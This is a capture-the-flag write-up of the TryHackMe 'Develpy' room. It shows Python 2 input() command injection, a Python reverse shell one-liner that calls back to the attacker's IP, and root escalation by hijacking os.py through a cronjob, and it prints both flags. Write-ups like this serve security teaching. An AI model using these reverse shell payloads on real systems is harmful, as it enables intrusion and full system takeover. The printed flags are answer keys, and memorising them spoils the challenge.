# Develpy Writeup - TryHackMe 🚩

This writeup documents the exploitation process for the **Develpy** machine on TryHackMe, covering everything from initial scanning to gaining `root` access via **Python Library Hijacking**.

## Room details
Difficulty: Medium

Type: Python, Linux Privilege Escalation

Link: https://tryhackme.com/room/bsidesgtdevelpy

## 1. Reconnaissance

The process began with a port scan using `nmap` to identify services running on target `10.81.159.78`.

```bash
nmap 10.81.159.78
```

Scan Results:

Port 22 (SSH): Open

Port 10000 (snet-sensor-mgmt): Open

![Nmap Results](<./assets/Screenshot 1.png>)
<br>
*Figure 1: Evidence ID: 001 (Nmap Port Scanning Results).*

---

2. Initial Access (User: king)
The service on port 10000 runs a Python 2 script that uses the input() function. In Python 2, this function is vulnerable to Command Injection because it evaluates user input as live Python code.

I executed the following reverse shell payload:

Python
```bash
__import__('os').system('python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.155.18\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')\"')
```
![Initial Shell](<./assets/Screenshot 2.png>)
<br>
*Figure 2: Evidence ID: 002 (Successful Command Injection via Python 2 input).*

---

Results:

Successfully obtained a shell as user king.

User Flag: cf85ff769cfaa721758949bf870b019

![User Flag](<./assets/Screenshot 3.png>)
<br>
*Figure 3: Evidence ID: 003 (User Flag Captured: cf85ff769cfaa721758949bf870b019).*

---

3. Privilege Escalation (To Root)
Enumeration revealed a root cronjob that runs a Python script located at /root/company/media/*.py. The system executes this script after performing a cd into the /home/king directory.

Technique: Python Library Hijacking
Since the working directory is writable by user king, I used the PYTHONPATH environment variable to hijack the module loading process.

Exploitation Steps:

Created a malicious os.py file containing a reverse shell payload.

Set PYTHONPATH to point to /home/king so the malicious module is loaded first.

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.155.18",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /home/king/os.py
export PYTHONPATH=/home/king
```

![Hijack Setup](<./assets/Screenshot 4.png>)
<br>
*Figure 4: Evidence ID: 004 (Python Library Hijacking - Malicious os.py setup).*

---

4. Capturing the Root Flag
I set up a netcat listener on my local machine (Kali Linux) using the port defined in the malicious os.py script.

```bash
nc -lvpn 4444
```

When the cronjob ran, the Python interpreter loaded my fake os module, executing the reverse shell with root privileges.

```bash
cat /root/root.txt
```
Final Results:

Root Flag: 9c37646777a53910a347f387dce025ec


![Root Shell](<./assets/Screenshot 5.png>)
<br>
*Figure 5: Evidence ID: 005 (Root Privilege Escalation and Final Flag).*

---

Final

![Root Shell](<./assets/Screenshot 6.png>)
<br>
*Figure 6: Finish.*

